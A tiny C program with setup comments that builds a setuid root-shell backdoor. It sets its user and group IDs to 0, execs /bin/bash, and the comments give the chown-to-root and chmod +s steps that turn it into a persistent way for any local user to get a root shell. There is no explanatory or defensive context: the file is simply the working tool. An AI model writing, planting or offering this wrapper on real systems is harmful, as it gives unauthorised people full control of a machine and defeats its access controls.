#include <unistd.h>

int main() {
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", 0);
  return 0;
}

// chown root:root
// chmod +s
// chmod o+t
